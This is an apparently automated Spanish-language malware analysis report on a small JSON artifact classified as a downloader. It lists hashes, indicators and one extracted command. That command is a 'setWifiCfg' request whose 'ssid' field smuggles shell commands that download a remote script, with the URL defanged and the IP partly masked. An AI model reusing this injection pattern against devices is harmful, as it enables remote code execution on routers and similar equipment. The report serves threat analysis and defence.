# 🧬 Payload Analysis

`d79a23b13fece5dd0c54c65b5437d2b8c88d1ffd0916ac2bd85f8bb6edb8de8d`

## 📌 Resumen

Artefacto identificado como JSON text data de 214 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:51:31.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `d79a23b13fece5dd0c54c65b5437d2b8c88d1ffd0916ac2bd85f8bb6edb8de8d`
- **SHA1:** `1c352592b46d7b49cce4f70fabcfd5e6c4929ab4`
- **MD5:** `ebc200547da59129417242a88aecca71`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | JSON text data |
| Tamaño | 214 B |
| Entropía | 4.9 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=JSON text data; iocs=5

## 🖥️ Comandos observados / extraídos

```text
{"command":"setWifiCfg","ssid":"cd /tmp;rm -f .s;wget hxxp://91.92.40.XXX/wget.sh -O .s;busybox wget hxxp://91.92.40.XXX
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| url | hxxp://91.92.40.XXX/wget.sh;chmod | strings |
| ip | 91.92.40.XXX | static_analysis |
| command | {"command":"setWifiCfg","ssid":"cd /tmp;rm -f .s;wget hxxp://91.92.40.XXX/wget.sh -O .s;busybox wget hxxp://91.92.40.XXX | strings |
| hash | d79a23b13fece5dd0c54c65b5437d2b8c88d1ffd0916ac2bd85f8bb6edb8de8d | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
